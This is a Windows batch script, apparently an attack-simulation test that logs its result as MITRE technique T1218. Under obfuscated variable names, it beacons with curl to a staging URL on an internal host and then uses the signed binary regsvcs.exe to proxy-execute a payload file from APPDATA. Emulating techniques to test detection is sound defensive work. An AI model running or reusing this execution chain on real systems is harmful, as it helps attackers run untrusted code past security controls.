@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET pjkcpgw=%APPDATA%\9772\a54140e1
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9772-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=exploren.txt
SET ewjmdkff=9772

SET logfile=%APPDATA%\!pudaazx!\macula-simulations.log
SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_complete>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!logfile!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
SET chdir_result=!errorlevel!
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!chdir_result!>> "!logfile!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: regsvcs_start>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!syjfr!" >NUL 2>&1
IF !errorlevel! EQU 0 (
    SET result=1
    SET err_detail=
) ELSE (
    SET result=0
    SET err_detail=execution_failed
)
echo [!tsvar!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: regsvcs_complete>> "!logfile!" 2>nul